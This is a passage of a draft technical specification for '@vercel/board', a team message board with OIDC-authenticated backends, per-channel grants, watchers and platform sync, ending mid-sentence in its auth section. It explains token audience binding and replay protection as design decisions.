# board: v1 spec (draft)

A message board for a team, its people, and its agents. It has one durable log,
verified authors, channels and threads, a live tail, watchers, and optional
two-way sync with Slack, GitHub, Linear, and any platform with a Chat SDK
adapter. The npm package `@vercel/board` ships `board()`, whose handle acts on
a board and serves it, its backends, and the CLI. The API sits under the
handle, and the handle sits under the CLI.

```ts
// scripts/deployed.ts
import { board } from '@vercel/board'

const team = board() // the team's default board, in Vercel's API
await team.post('deploys', 'www@a1b2c3 is live')
```

`board()` with no backend is the team's default board in Vercel's API
(`vercel()`, internal: `src/server/backend-vercel.ts`); `board({ name })` is
another of the team's boards, and `board({ team, name })` a board on another
team. With `BOARD_URL` set, in Node, it's the board at that URL instead
(`http()`, internal too: `src/server/backend-http.ts`), which is `vb serve`'s.
Neither backend is exported: people write `board()`. In a
Vercel deployment it authenticates with the deployment's OIDC token, and
elsewhere with `BOARD_TOKEN`, `VERCEL_AUTH_TOKEN`, a GitHub Actions job's OIDC token, or `vercel login`, never `VERCEL_TOKEN`. Vercel's API keeps
the board: messages, threads, reactions, labels, a channel's changes,
schedules, files, and watchers, whose matches it wakes the deployment to run.
It doesn't run sync yet: `board({ sync })` on it throws when it binds.

```ts
// app/api/board/[[...path]]/route.ts
import { board } from '@vercel/board'

export const team = board({
  watch: {
    triage: {
      tail: 'support',
      run: async ({ event, board }) => {
        if (event.type === 'message.posted' && event.message?.re === null) await board.reply(event.message.id, 'on it')
      },
    },
  },
})
export const GET = team.fetch, POST = team.fetch // the wake-ups that run its watchers
```

`local()` from `@vercel/board/backend-local` keeps a board in this process:
SQLite under `.board/`, one file per board's name, files next to it, and a
scheduler whose timers live in the process; `local({ memory: true })` keeps
it in memory for tests. It's for development, `vb serve`, tests, and working
offline, never serverless functions, and it's where a board with sync runs. Its
engine (the log, its consumers, and the tables reads come from) is internal to
board: nothing exports it, and [The local board](#the-local-board) describes
what it does.

```bash
board post errors-www "deploy failed on a1b2c3"   # in a linked project: the team's board
```

## The model

1. **A board is one log.** A team keeps its boards in Vercel's API, each by
   its name, and `local()` keeps one in a process.
2. **Every request carries an OIDC token** (by default: a host's
   `authenticate` can take its own credentials). People get theirs from their
   `vercel login`, and machines get theirs from their platform. Vercel's API
   lets the team's people use its boards, and the projects each is granted
   to. A board `board()` keeps trusts its own project's people and its
   deployments in the environment it runs in, plus whatever its grants let
   in, and they say what each may do in each channel.
3. **Every event records who wrote it**: a verified principal, plus an
   optional profile, such as an agent acting for a person.
4. **A thread syncs with a set of external threads.** A message written in the
   thread, wherever it was written, is delivered to every one of those external
   threads except the one it came from.
5. **Sync is configured per platform, keyed by the platform's own things.**
   Slack sync is keyed by Slack channels, GitHub sync by repos, and Linear
   sync by teams. A key maps either to a board channel, which makes a
   two-way mirror, or to a function, which handles inbound events however you
   like.

## Principles

- **Access is per channel.** People and the board's own deployments in its
  environment may do everything; a grant says what other principals may do in
  each channel: `read`, `post`, `react`, `label`, `sync`, or `manage`. Reads
  are gated, so a write-only caller is `['post']`, and what a caller can't
  read answers 404. A grant names who it lets in, so a credential lives as
  long as its OIDC token. People go through grants too: closing `security/` to
  `everyone` and opening it to Alice keeps the rest of the team out.
- **No accounts.** The board has no login page, sessions, or user table.
  Principals are strings derived from verified OIDC claims, from verified
  platform webhooks, or from a host's own `authenticate`.
- **Provenance is server-authored.** The `by`, `origin`, and sync receipt
  fields are never taken from the request body. This is the same
  rule as Just Chat's trusted message metadata.
- **Wiring is code; the log holds facts.** Sync functions, watchers,
  and the verifier live in `board()` and its backend's config, where they're reviewed and deployed.
  They're never stored as data in the log. Who sees a fact is decided when it's
  read: folds stay global, and filters are per reader. On a local board, log
  indexes still show how busy the board is.
- **Everything is legible in plain text.** Actor IDs are readable strings, not
  hashes. A message ID is also a cursor, and on a local board both are plain
  decimals. The CLI is a product constraint, not a lesser frontend.
- **The log is the only source of truth.** On a local board, messages are
  read from tables the `board-tables` consumer keeps from it, with the same
  folds, and smaller views are reducers. Both are derived: the tables fill
  from the log on their own, and reducer snapshots are caches, safe to delete.
  There's no second data model.
- **The board log holds facts people read.** It's one log, deliberately, because
  that gives one global order, reducers that see everything, and atomic
  batches. Keeping it lean is our side of the bargain: bookkeeping lives in side
  sessions (raw platform events, watcher matches, schedules), and scaling one
  log is the engine's job.
- **One file per board, on `local()`.** Everything a local board persists goes
  through its SQLite file, except attachments, which sit beside it, and every
  background job goes through its scheduler, in the process. Sync needs no
  state store of its own.
- **One handle.** The CLI, your scripts, watchers, and sync functions all act
  through a handle from `board()`. Only the backend and who it acts as differ.
- **Fan-out is not a read path.** Consumers exist only to keep the tables and
  to work with external systems: running inbound mappings, delivering outbound
  messages, and running watchers. Inbox-style views are queries.

## Package layout

One package, `@vercel/board`, with subpath exports:

| Import | Contents | Runtime |
| --- | --- | --- |
| `@vercel/board` | `board()`, the handle on a board, with its types; the `Backend` and `Protocol` types, `HttpError`, watchers, and middleware. The `node` build also finds the board and a token (see [The handle](#the-handle)) | isomorphic |
| `@vercel/board/access` | Who may use a board: `oidcTokens()`, `board()`'s default `authenticate`; `resolveActor()`; `compileAccess()`, `union()`, `FULL_ACCESS`, and `DEFAULT_CAN`; `parseCan()` and `CAN_MAX`, which read `x-board-can` as the board does; and the permission types | server |
| `@vercel/board/schemas` | How a board keeps schemas and reads blocks, as plain functions that import nothing: `checkDefinition()` and `checkValue()`, which check a definition and a value against one; `canonical()`, by which two definitions are the same version; `findBlocks()` and `block()`, which read and write a message's blocks; `parseSchemaId()`; and `BUILT_IN_SCHEMAS`. For a server that keeps a board itself, as Vercel's API does | isomorphic |
| `@vercel/board/cli` | The CLI, to embed: `createApp()` runs it inside another CLI, without `inspect` and `serve`, `vb()` runs a command in-process on a handle, returning what it prints, and `commandWord()` names the command an argv runs | server |
| `@vercel/board/inspect` | `inspector({ board, basePath })`, the inspector's page, bundle, and proxy as a route handler (`(Request) => Response`) under `basePath`, acting as that handle under the profile the page picks | server |
| `@vercel/board/conformance` | `conformance()`, which checks that a board speaks the protocol | isomorphic |
| `@vercel/board/backend-local` | `local({ dir?, memory? })`, a board kept in this process: SQLite under `.board/`, one file per `board({ name })`, whatever its `team` (`local.db` for the default board), attachments beside it, and a scheduler in the process; `memory` for tests. For development, `vb serve`, tests, and working offline | Node |
| `@vercel/board/sync-slack` | `slack()`, the Slack sync adapter | server |
| `@vercel/board/sync-github` | `github()`, the GitHub sync adapter | server |
| `@vercel/board/sync-linear` | `linear()`, the Linear sync adapter | server |
| `@vercel/board/sync-chat-sdk` | `chatSdk()`, which syncs any Chat SDK adapter, with hooks for what it can't read from the adapter | server |
| `@vercel/board/sync` | Shared event schemas, `SyncProvider`, the sync function's types (`Sync`, `SyncFn`) and helpers (`channels`, `mirror`, `into`, `render`) | server |
| bins `board`, `vb` | The CLI, built only on `board()`. `vb` is a short alias, and `board` is the one `npx @vercel/board` runs | Node ≥ 22.18 |

A backend's own pieces live under its path (`@vercel/board/backend-local`), and
everything that works with any backend lives at the top. The backends
`board()` picks itself, `vercel()` and `http()`, are internal: its builds load
them, and nothing exports them. Sync adapters are named for the Chat SDK adapter they
take, and `sync-chat-sdk` takes any: `sync-slack` takes `@chat-adapter/slack`.
A platform with an entry of its own gets more than `chatSdk()` reads from its
adapter. board builds in Slack, GitHub, and Linear; any other platform comes
through `chatSdk()` or a provider of its own.

### Backends

`board({ backend, name, team, authenticate, access, middleware, watch, sync, url,
basePath, streamMaxMs })` mounts a board on a backend, which says where the
board lives. `name` says which of the team's boards it is (`security`, or
none for the team's default board), and `team` whose: another team's, by
its ID or slug, or none for the team the environment finds. A name is 1 to
64 characters with no `/`, and `board()` throws on one that isn't. `board()` owns the HTTP and the policy on every backend: it routes
each request, validates it with the schemas in `src/api/routes.ts`, checks the
shape of its `x-board-*` claims, verifies its caller with `authenticate`
(`oidcTokens()` from `@vercel/board/access` by default), works out the actor (the
principal plus its claimed profile, `vercel:user:u_123+claude`), works out
what it may do, runs the [middleware](#middleware), maps errors, and serves
`/avatars/:name`, `/openapi.json`, discovery, and SSE. It calls the backend's
method of the same name as the route with the caller it verified. Nothing with
side effects runs for a request before its access allows it: it resolves a sync
target on a platform (which can join a Slack channel), looks up an email,
records who that is, reads an upload, or runs the middleware only for a caller
that may (`post`, and `sync` for targets, where the write lands). A request it
may not goes to the backend as it came, which refuses it. It keeps verified
token principals by credential until they expire, and each request's principal
for the request's life, and works out what a stream's caller may do again for
each page. What it returns is [the handle](#the-handle), whose `fetch` is that
one handler (`export const GET = team.fetch, POST = team.fetch`). TypeScript
rejects an option on the call it doesn't belong to; nothing checks at runtime.

- **A backend is a plain object** (`Backend` in `src/server/backend.ts`): one
  async method per protocol method (`Protocol` in `src/api/protocol.ts`), each
  `(caller, input, signal)`, plus `routes`, `keeps`, and `bind`. `board()`
  only ever calls these: it verifies and decides, and the backend stores,
  honoring what each caller may do. `typing` and `readSource` are methods too,
  and so is `discovery`, which a handle asks: a request's discovery is
  `board()`'s, the URL it reached and the project tokens are minted for, with
  the sync entries a backend that keeps the board lists. `input` is what the route's schema parsed; the output is what the route
  answers, 201 for `post`, `schedule`, and `upload`. `attachment` answers the
  file's record and bytes, and `board()` serves them with the headers that keep
  a file from running as a page. A method throws `HttpError` for a status and
  code of its own.
- **A caller** is `{ identity, origin }`, one `board()` verified:
  `identity.principal` (who it is, with its `access`, narrowed by the `scope`
  it sent), `identity.author` (the author record its writes carry), and
  `identity.actor` (the actor it writes as). It's a request's
  (`origin.via.kind` is `api`), or for work a backend does outside requests,
  the one it's done for: a schedule's creator at its send (`schedule`). A
  backend trusts it as it is, since only `board()` makes one, in process, and
  every method honors its access. Or `{ self, origin }`, this deployment's own
  code: the handle (`origin.via.kind` is `client`, and `self` the profile from
  `as()`, or null), a watcher (`watcher`), the middleware's handle
  (`middleware`), or sync (`engine`); who `self` is on its board, each backend
  says. Claims are labels under the verified principal, never security.
  `origin` is in-process only: board() sets `config` (the targets a new root's
  channel syncs with), and no request carries it.
- **`routes`** are a backend's own, beside the protocol. `board()` verifies
  nothing for them: a request's `caller` is null, and the route checks what it
  needs. One at a protocol route's path takes its place.
- **`keeps`** says whether the board lives in the backend. One that keeps it
  (`local()`) serves requests: people, the board's own deployments in its
  environment, and whoever its grants let in, which it hands `board()` as
  `trust` (`grants()`). One that
  doesn't (`vercel()`, `http()`) serves no request but wake-ups and webhooks,
  and verifies none.
- **`bind(binding)`** is called once, when `board()` is created, before any
  request, and does no I/O. It's what background work needs from the board:
  `name` and `team`, `board({ name, team })`'s or null, which `vercel()`
  resolves to a board on that team (once: `GET /v1/messageboard/boards?name=`,
  then `POST …/boards/ensure` unless `ensure` is false, which gets 404
  `no_board` instead; `vb` passes false without `--ensure`. A name a board the
  caller can't see has gets 409 `board_name_taken`) and `http()` and `local()`
  leave unread (`local()` keeps a file per name, whatever the team);
  `subscriptions` (each watcher's tail, and sync's at `@sync`, which gets every
  post, change, and thread sync) with `run(id, event, { trigger, attempt })`;
  sync's inbound, `receive(key, event, { id, attempt })` for a backend that
  delivers what sync pushed in-process, and `pull()` for one that queues it;
  `sync` (board()'s sync entries); `readSource(key, target, limit)` and
  `typing(messages, status)`, what only board()'s sync can do, which a backend
  answers those methods through; `accessNow(principal)`, board()'s policy for
  a principal the backend stored (a schedule's creator at each send, a
  registrant at each event and pull, the syncs discovery lists), null once
  it may do nothing; `project()`, the board's Vercel project; `handle(caller)`,
  a handle through board(), as a verified caller (a schedule's creator, whose
  posts keep their IDs) or its own code, so what a backend writes for someone
  goes through the middleware; and `url()`, the board's own URL once it's
  known.
- **Sync runs in `board()`,** on every backend (see [Sync](#sync)). Sync's
  adapters, webhooks (`/webhooks/:key`, no token), and `/messages/:id/sync` are
  `board()`'s routes; sync reads and writes only through the protocol, as its
  own caller. `readSource` and `typing` are protocol methods: `local()` answers
  them through the binding, so they work from the CLI against the board that
  runs the sync, and a board that runs no such entry answers 404
  `not_synced_here` for a source read.
- **SSE is built from `events`,** the long-poll: `board()` loops it, sends each
  event with `id: <its cursor>`, and a bare `id:` when a page's cursor moved
  past its last event. It honors `Last-Event-ID` when `after` is absent, pings
  every 15 seconds, and closes at `streamMaxMs`.

The backends board ships: two internal ones, which `board()` picks when it's
given none, and `local()`, exported. A backend of your own is the fourth kind,
checked with `@vercel/board/conformance`.

- **`vercel()`**, internal (`src/server/backend-vercel.ts`; the Node build's
  in `src/backend-vercel/index.ts`, the default build's in `index.default.ts`),
  is the team's board in Vercel's API: what `board()` with no backend uses, in
  Node while `BOARD_URL` is unset, and outside Node with the `board({ fetch })`
  it requires; and the CLI's board without a URL. Its own options (`board`, a
  board by its ID; `api`; `files`, how bytes reach storage) have no public
  form, and `team` and `fetch` are `board()`'s. It keeps nothing: its methods
  call `/v1/messageboard` as this deployment, with its OIDC token, or as you,
  with `BOARD_TOKEN` or the login the Vercel CLI hands it, or in GitHub Actions
  as the job's run, with its OIDC token for `https://api.vercel.com/v1/messageboard`, on the board
  `board({ name, team })` names. Messages, threads, reactions, labels, a channel's changes, schedules,
  files (direct uploads too, on URLs the API signs for the bytes' SHA-256),
  and watchers work. Vercel's API posts each schedule's sends, so `board()`'s
  middleware screens a schedule when it's made. What the API doesn't keep yet
  answers 501 `not_supported`: files on a scheduled message and a post's sync
  targets. Grants go to the API, `github` and `oidc` principals included,
  and what it refuses is said in its own words. It names a GitHub Actions run
  `github:repo:<repository_id>` (handle `owner/repo`) and another issuer's
  caller `oidc:<issuer host and path>:<sub>` (handle its `sub`), both of kind
  `workflow`. It
  runs no sync: `bind` throws for a board with `sync`, `readSource` answers
  404 `not_synced_here`, and `typing` reaches no targets. Only a deployment's
  own credentials register watchers there: its OIDC token. Its watchers run as
  [watchers woken by their board](#watchers-woken-by-their-board) says: it registers their tails with the API, which wakes
  this deployment by its path on its project, through Deployment Protection,
  from every deployment on Vercel (production, a branch's preview, which names
  its branch, a `vercel deploy` preview, a custom environment), which never
  pulls on its own. Only off Vercel does it register no URL and pull on its
  own: it never sends the API a `url`. Deployed on Vercel means `VERCEL` is
  `1` outside development, so a dev server with `vercel env pull`'s env, or
  under `vercel dev` (`VERCEL_ENV=development`), counts as off Vercel, for
  this and for the tails below. With anyone else's
  credentials (a person's, an app's), the API answers 403
  `watchers_need_project`, so nothing registers: a `/me` principal that isn't
  a project tells it so, and from then on each config
  watcher runs in this process as a tail, following `events` from the head as
  `vb tail` does, with local()'s retries, and skipping its own writes. Sync
  doesn't run for them, and on Vercel neither do the tails: a deployment's
  watchers need its own OIDC token. Its routes are `POST /wake` and `POST /watchers`,
  which registers now; on a board run with anyone else's credentials, a
  wake-up runs nothing and a registration answers 403 `watchers_need_project`. It doesn't keep the board, so a board
  on it serves no requests but wake-ups and webhooks: any other answers 404
  `this board uses Vercel's, and answers only wake-ups and webhooks`, and none
  is verified.
- **`local({ dir?, memory? })`**, from `@vercel/board/backend-local`, keeps
  the board in this process, on the board's internal engine (see
  [The local board](#the-local-board)). Its log and tables are one SQLite file
  under `.board/` (or `dir`), named for `board({ name })` (`local.db` for the
  default board, whatever the `team`), with its attachments in the folder
  beside it, and its scheduler's timers live in the process; `memory` keeps
  all of it in memory, for tests. It opens on the board's first call, and one
  it can't open answers 500 `no_store`, saying where. A restart drops pending
  timers, so it's for development, `vb serve`, tests, and working offline,
  never serverless functions. It trusts the callers `board()` verified, and
  what it does outside requests that needs the policy, it asks `board()`
  through the binding: each event's access for registered watchers, each
  pull's, a schedule's send-time re-check and revocation, and which
  registered syncs discovery still lists. A schedule's send goes through
  `board()`, as its creator, on the binding's handle, so the middleware sees
  it. A verified caller writes as its actor; `{ self }` writes as
  `board:client` from the handle, `board:client:<profile>` from
  `as(profile)`, `board:watch:<id>` from a watcher, `board:middleware` from
  the middleware's handle, and `board:sync` from sync. It delivers sync's
  subscription in-process, on the `board-sync` consumer's thread lanes, and
  what sync pushes to its inbox on `board-inbox`'s platform-thread lanes, so
  both keep the engine's retries. It has no routes of its own, and takes no
  direct uploads (501 `no_direct_uploads`): a file is at most 4 MB, or 25 MB
  from its own sync. Its extra is `close()`, which closes its file.
- **A backend that keeps no schedules or no files** says so with a 501:
  `schedule` answers `no_scheduler`, and `upload`, a post, schedule, or sync
  import that carries `attachments`, and `attachment` answer `no_files`. Sync
  brings a platform's files over as links instead, one line each
  (`📎 [shot.png](https://files.slack.com/…) (7 B) didn't come over: this
  board keeps no files`, or the name alone when the platform gave no URL), and
  sends none out.
- **`http()`**, internal (`src/server/backend-http.ts`; the Node build's in
  `src/backend-http/index.ts`), is what `board()` uses in Node with
  `BOARD_URL` set, the CLI's for `--url`, and the inspector page's, on its
  local proxy. It uses the board at that URL, which keeps the log: its
  methods call it through a `fetch` that brings the credentials. In Node
  that's what `vb` uses: a token from `BOARD_TOKEN`, a local board's token
  file, GitHub Actions or Vercel OIDC, then `vercel login` (minting for the
  project the other board's host is a deployment of, and only when its
  discovery names the same), your handle, and the Deployment Protection
  handling; in the inspector's page it sends the page's per-run token to the
  proxy. Its board's
  middleware runs on what it writes, and the other board's after. A `{ self }` caller
  writes there as this deployment with `self` as its profile (the handle's
  own with the profile `BOARD_PROFILE` names), and a post whose ID
  `board()` derived (from a watcher's trigger, or from the handle's `id` and
  profile) gets `key:<principal>:<sha256 of that ID>`. Any board takes a
  `key:` ID only in exactly that shape from that principal (`key:`, its ID,
  `:`, and 32 hex characters, since one principal's ID can be the start of
  another's), so the same `id` never posts
  twice and no one can post with one first (and `posted`, a retry's lookup,
  asks for the same). Its board answers nothing itself: a request, discovery
  included, answers 404 `<url> answers nothing itself`, and none
  is verified, and it has no routes of its own. Its `discovery` for its own
  handle reads the other board's. It registers nothing with the other board,
  and nothing wakes it: its config watchers run in this process as tails, from
  its first use, following `events` from the head as `vb tail` does, with
  local()'s retries, and skipping their own writes, which go as this
  deployment with the watcher's ID as its profile. On Vercel none run, since a
  function doesn't outlive its request, and it logs so once. `bind` throws for
  a board with `sync`: sync runs where the log is, in that board's own config
  or Vercel's. People and the CLI use the other board, by its URL.

### IDs, cursors, and versions

The backend picks them; the protocol only says their shape:

- **Message IDs, schedule IDs, and cursors are opaque strings** of 1 to 128
  characters (`Ref` in `src/api/routes.ts`). Clients compare them for equality
  and pass them back as they got them; they never parse them, count with them,
  or order by them. Payload IDs in event views (`id`, `re`, `replyTo`, a
  schedule's `id`, a link's `message`) are strings too.
- **A message ID works as a cursor.** `after` and `before` take either; one the
  board can't read as a cursor answers 400 `invalid_cursor`. Every read reports
  `cursor`, and every event view carries its own `cursor` (SSE's `id:`).
- **Every message view has `version`,** a number that grows with each change to
  the message: of two views of one message, the higher `version` is newer.
- **On `local()` they're log indexes.** A message's ID is the index of its
  `message.posted` event, in decimal (`"812"`), and a schedule's the index of
  its `schedule.created` event in session `schedules`, after an `s` (`"s12"`),
  so it reads apart from a message's. A cursor is the index a read reflects, or
  an event's own, and a version is the index of the last event that changed the
  message. The log and the tables keep numbers; only views are strings. The CLI
  shows a message's as `#812`, and a schedule's as the board gave it.
- **Vercel's board hands out its own:** `msg_<thread>_<n>` for a message,
  which the CLI prints bare and takes as a message even where a channel has
  that name, and cursors of the backend's own.

### The protocol and conformance

- **Every board answers the whole protocol:** discovery, `/me`, `/channels`,
  `/actors`, `/messages`, `/threads`, posting, editing, deleting,
  reacting, labeling, typing, source reads, schedules, tasks, attachments,
  registered watchers, sync's records, and `/events`. There are no optional
  groups, and discovery lists none. A backend may keep no schedules, tasks, or
  files, and says so with a 501 (`no_scheduler`, `no_tasks`, `no_files`), which
  the kit reports as not kept here; one that keeps no schemas answers 501
  `no_schemas`.
- **`@vercel/board/conformance` checks a board through a handle,** `conformance(board())`, all of it, a group
  at a time in the report (`core`, `schedules`, `tasks`, `attachments`,
  `watchers`, `sync`). It writes to one channel, and for the tasks checks that need two, to `tasks`
  under it, every post kept on the board and labeled
  with the run, and deletes what it posted. Its `schemas` group registers one
  version, `conformance@1`, the same on every run, which stays: a version is
  never removed. A check the board answers with a
  501 in `schedules`, `tasks`, or `attachments` is `skipped`, with the detail `not kept
  here: <the board's message>`; one that would replace the caller's own
  registration is skipped too. `vb conformance` runs it as the CLI's identity,
  with `withHeaders` for its own credential with headers of the run's (as a
  client or a proxy holding it sends them): an `x-board-can`, so the narrowing
  checks see that caller refused outside its `can`, on its principal's
  watchers and sync's records, and changing grants past it (`withCan`, which
  code may still pass, is `withHeaders` with that one header), and who writes:
  a profile with its avatar in one `x-board-profile`, which the author view must
  show, and `x-board-avatar` and `x-board-session`, which released clients
  still send and which must be ignored: a post that carries them lands as its
  verified actor, with no avatar but its profile's header's and no session. A
  `core` check also reads that no `by` on a message or an event, and no `/me`,
  carries a `session`, and another that a profile changes only its own
  messages, and its principal all of them. It exits 1 when a check fails.
  Vercel's API fails that one until it holds a profile to its own messages,
  and the profile's and `x-board-avatar`'s checks until it reads who writes as the
  protocol has it (`fakeMessageboard({ protocolProfile: true })` in board's tests is it
  once it does). board's own tests run
  it against boards on its internal engine, one of them keeping no schedules or
  files (which reports those two as not kept here), and against boards broken
  on purpose, so the kit and the backends can't drift apart unnoticed.

### Watchers woken by their board

A deployment's watchers on Vercel's board (`board()` with no backend) run on
what Vercel's API matches for them: the API matches the tails, wakes the
deployment at its path with nothing in the wake-up, and the deployment pulls
and runs `run`. A board on the internal engine (`local()`) keeps a registry
too, and matches what's registered there, but wakes nothing: its registrants
pull. What follows is how it keeps the registry; Vercel's API answers the same
routes its own way:

| Route, on the board with the log | What |
| --- | --- |
| `POST /watchers` | `{ watch, sync? }` or `{ path, branch?, watch, sync? }`: registers the caller's watchers and sync entries, replacing its last registration. Needs `read` somewhere, and `sync` somewhere for sync entries; at most 64 watchers (400 `too_many_watchers`), as the internal engine checks it, or as Vercel's API does. Without a `path` the caller pulls on its own. A `url` answers 501 `no_wake_by_url` on the internal engine, which wakes nothing, and 400 on Vercel's API, which wakes only paths. `path`, on a board whose discovery says `wake_by_path`, wakes the caller's own Vercel project there instead, through its Deployment Protection: the board takes the project and environment from the caller's token and finds the deployment, so a project can only register itself, and a caller that isn't a Vercel project (a person, say) gets 403 `not_a_project`. Production wakes its best production domain; a preview of a branch names its `branch`, and wakes that branch's latest ready preview; a preview with no branch (`vercel deploy`) wakes that deployment, and a custom environment its latest ready deployment, as the caller's token says. The board finds the deployment again for each wake-up. A board that can't find a project's deployments answers 501 `no_wake_by_path`. A registration answers `{ url: null }`, or `{ url: null, path, branch? }` |
| `GET /watchers` | Every registration to `manage` in every channel, the caller's own to anyone else |
| `GET /watchers/matches?limit&wait` | What the caller can run now, each leased to it for 5 minutes. `wait` holds the request up to 25 seconds for one |
| `POST /watchers/matches/:id/ack` | `{ lease, error?, skip? }`: done, an error to try again, or a skip |

| Route, on a deployment's board on `vercel()` | What |
| --- | --- |
| `POST /watchers` | Registers its own watchers with Vercel's API, now. No body, no token |
| `POST /wake` | Something matched. It registers again if `x-board-watchers` isn't its own hash, then pulls, runs, and acks until nothing's left. It answers `{ ran }` when that's done, or 202 after 2 seconds while it keeps going |

- **Registrations** live in `board-registry`, session `registry`, one per
  principal with its token facts, so its access is worked out again at each
  match under the grants as they are then. A deployment on `vercel()`
  registers on its first use (a method call or one of its routes) if it knows
  its URL, on `POST /watchers`, and on a wake-up with a stale hash; creating
  it does no I/O. Its path is the mount path of `board()`'s `url()`: `url`, or
  on Vercel its production domain (a preview's own URL there) under the mount
  path a request showed, never a request's `Host`.
- **Matching** is `board-watchers`, as for config watchers. A registered
  watcher sees what its registrant may read, as `/events` shows it, and its
  writes (`<principal>+<id>`) never wake it, but for what a schedule of its
  own posts. One event's matches for one
  registrant are one append, to `watch:@<principal>` in `board-watch`.
- **The queue** is a reducer over that session: one queue per watcher and
  thread, of which only the oldest is handed out, so a thread's matches run in
  order. Pulling leases it (`watch.leased`, an ID derived from the match and
  its try, so two pulls at once lease it once); acking ends it
  (`watch.acked`). What one pull changes is one append, and one read after it
  tells which leases are its own. An error waits 1 second, doubling to 30,
  before a pull hands it out again. A lease that runs out (`watch.expired`,
  recorded by the next pull) counts as a try. After 5 tries it's `watch.failed`, and the thread goes on.
  A pull drops what the registrant can't read anymore (`watch.skipped`).
- **A deployment Vercel's API can't wake** (off Vercel, as on a dev server)
  registers with no `path` and pulls on its own from its first use, each pull
  held open until something matches. One on Vercel registers its path and
  never pulls on its own, since a function doesn't outlive its request.

### Install

```bash
pnpm i @vercel/board                                  # the handle, local(), the API, and the CLI
pnpm i chat @chat-adapter/slack @vercel/connect       # + sync with Slack through Connect (@chat-adapter/github for GitHub)
pnpm i chat @chat-adapter/telegram                         # + sync with any other platform through its Chat SDK adapter, like Telegram
```

Only `@vercel/board` is needed to run the CLI against an existing board, e.g. with
`npx @vercel/board`.

**Dependencies:**

- **Bundled: the local board's engine.** board inlines it into its own build,
  so installing board installs nothing else for it. Only
  `@vercel/board/backend-local` loads it, and nothing on the way to a handle
  over `vercel()` or `http()` does. It keeps its board in Node's own `node:sqlite`.
- **Peers, optional, for sync: `chat`, `@chat-adapter/slack`,
  `@chat-adapter/github`, `@chat-adapter/linear`, `@vercel/connect`.**
  `@vercel/board/sync-slack`, `@vercel/board/sync-github`, and
  `@vercel/board/sync-linear` build their adapters with them, from Connect or from
  secrets. `@vercel/board/sync-chat-sdk` takes an adapter you install. Your own
  adapters must match the `chat` version that board builds its Chat instances
  with. Sync's correctness comes from the board log, and its Chat instances
  keep only best-effort caches in memory, so the built-in entries need no Chat
  SDK state adapter; `chatSdk()` takes one, as `state`, for an adapter that
  reads back what it stored.
- **Regular dependencies:** `zod` (v4), `jose` for JWT and JWKS verification,
  and `@vercel/oidc` for client-side token minting.

## API technology (decision)

- **Zod v4 schemas are the single source.** A route table of
  `{ method, path, query, body, response }` drives server validation, the
  typed client (types are inferred, with no codegen), and `GET /openapi.json`
  via `z.toJSONSchema`.
- **The router is hand-rolled over the Fetch API.** It is about 100 lines with
  no framework. The handle's `fetch` is the handler, so it runs in a Next.js
  route, a Vercel function, or any fetch runtime. The local board's engine
  speaks Standard Schema too, so its events and the API share validators.
- **Only GET and POST are used.** The mount is always
  `export const GET = team.fetch, POST = team.fetch`, and every mutation is a
  POST to a resource path.
- **The local board's engine is never exposed.** All writes go through the
  board API so that `by` and the other provenance fields stay server-authored.

The alternative is oRPC, which provides OpenAPI and a typed client over Standard
Schema. It is reasonable if we'd rather not own the router, but the surface is
small enough that owning it keeps the dependency tree and the wire format
simple.

## Identity and auth

### Tokens

Every request sends `Authorization: Bearer <OIDC JWT>`. **Every token's `aud`
is the board's URL** (`https://www.example.com/api/board`, as returned by
discovery), so a token sent to one board can't be replayed anywhere else. That
includes another board mounted on the same origin. The one exception is `/webhooks/:name`, which is authenticated
by the platform adapter (see [Sync](#sync)).

In Node, a handle on a board at a URL (`BOARD_URL`, or `vb --url`) finds a
token in this order, and the first match wins. Outside Node, `board({ fetch })`
brings credentials for Vercel's board (see [The handle](#the-handle)).

| Where | How | Principal |
| --- | --- | --- |
| Explicit | `BOARD_TOKEN` (any OIDC JWT, for other CI systems and tests, or a placeholder a sandbox's network policy replaces) | depends on the issuer |
| A local board (`vb serve`) | the token file it writes for its URL, only for loopback URLs | `local:user:<os user>` |
| GitHub Actions | `ACTIONS_ID_TOKEN_REQUEST_URL`, with audience set to the board URL (needs `permissions: id-token: write`) | `github:repo:<repository_id>` |
| A Vercel deployment | `@vercel/oidc` `getVercelOidcToken({ audience })` | `vercel:project:<project_id>:<env>` |
| A local terminal | your Vercel CLI login mints a development token for the project the board's host is a deployment of, then an exchange for the board's audience | `vercel:user:<user_id>` |
| A board whose discovery names no project | no token: there's none for a login to mint, so the request goes without one, for the board's verifier to say whose it is. A 401 is `no_project` | the verifier's: `tailscale:user:<login>` on `vb serve --tailscale` |

- **Local minting uses the Vercel CLI login.** With the CLI's credentials
  (`getVercelToken`) the client calls `api.vercel.com/v1/projects/<id>/token`,
  or `vercel project token <id>` when they're in the keyring, and caches the
  result. Vercel only mints this token for accounts that can access the
  project, so **access to the board equals access to its Vercel project**.
- **The `user_id` claim identifies the person.** On development tokens it holds
  the ID of the user the token was issued to. It exists only on development
  tokens, and that's exactly the case we use it for.
- **Discovery:** `GET /` is unauthenticated and returns
  `{ version, url, audience, team_id, project_id, sync, wake_by_path? }`, so the client knows
  which project to mint for. The CLI can run from any directory. Discovery is unauthenticated,
  so the client never takes its audience from it: every token's audience is the
  URL the client sends it to. When discovery's `audience` differs, the client
  mints and sends nothing and fails with `wrong_audience`, naming the board's
  URL. Otherwise a board could claim another board's audience and project, and
  replay the token it's sent there.
- **Nor its project.** Any board can name any project the person can access,
  and Deployment Protection's Trusted Sources ignore `aud`, so a development
  token for that project could be replayed past the protection of deployments
  that trust it. Before minting, the client asks Vercel with the person's login
  which project the board URL's host is a deployment of (`findProject`, as for
  the bypass below: `/v13/deployments/<host>`, which resolves deployment URLs,
  branch aliases, and domains, then `/now/aliases/<host>`, in their scope and
  then each team). It mints for that project and its owner, and only when it's
  the one discovery names: otherwise `wrong_project`, or `no_access` when
  Vercel finds nothing there for the person, and discovery's `team_id` plays no
  part. A loopback host has nothing to look up: a board there runs on the
  person's machine (`next dev`), so the client mints for the project and team
  it names.
- **Deployment protection:** hosted Vercel clients send their audience-bound
  OIDC token in `x-vercel-trusted-oidc-idp-token` for the edge and in
  `Authorization` for the board. Discovery uses `BOARD_TOKEN` first,
  otherwise it mints an edge token with the configured board URL as audience. Local person clients do not add the trusted-OIDC
  header. Configure Deployment Protection Trusted
  Sources for the calling project and environment separately from the board's
  grants. `VERCEL_AUTOMATION_BYPASS_SECRET` takes precedence, without
  requiring runtime OIDC for discovery. On Vercel it's a system variable holding
  the deployment's own project's secret, so a hosted client sends it only to the
  deployment's own hosts (`VERCEL_URL`, `VERCEL_BRANCH_URL`,
